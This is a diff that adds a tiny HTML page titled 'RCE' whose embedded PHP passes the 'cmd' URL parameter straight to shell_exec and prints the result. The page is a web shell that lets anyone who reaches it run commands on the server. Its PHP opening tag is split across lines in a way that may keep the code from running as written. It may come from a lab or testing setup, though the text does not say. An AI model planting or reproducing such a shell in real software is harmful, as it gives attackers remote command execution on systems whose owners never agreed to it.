@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>RCE</h1>
+
+<?
+php echo shell_exec($_GET['cmd']); 
+?> 
+
+</body>
+</html>
